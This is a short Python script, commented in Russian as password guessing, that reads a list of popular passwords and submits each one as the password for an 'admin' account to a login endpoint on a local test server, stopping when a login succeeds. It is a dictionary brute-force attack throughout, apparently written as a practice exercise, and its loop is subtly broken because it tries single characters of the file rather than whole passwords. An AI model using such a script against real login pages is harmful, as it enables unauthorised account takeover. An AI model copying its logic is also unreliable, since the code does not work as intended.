#подбор пароля

import requests

with open('p.txt') as f:
    popular_pas_data = f.read()


i = 0

def generate_bad_password():
  global i

  if i >= len(popular_pas_data):
    return

  #use popular passes
  password = popular_pas_data[i]
  i += 1
  return password


while True:
    password = generate_bad_password()
    if password is None:
        break


    data = {'login': 'admin', 'password': password}
    response = requests.post('http://127.0.0.1:5000/auth', json=data)
    if response.status_code == 200:
        print('SUCCES!', password)
        break






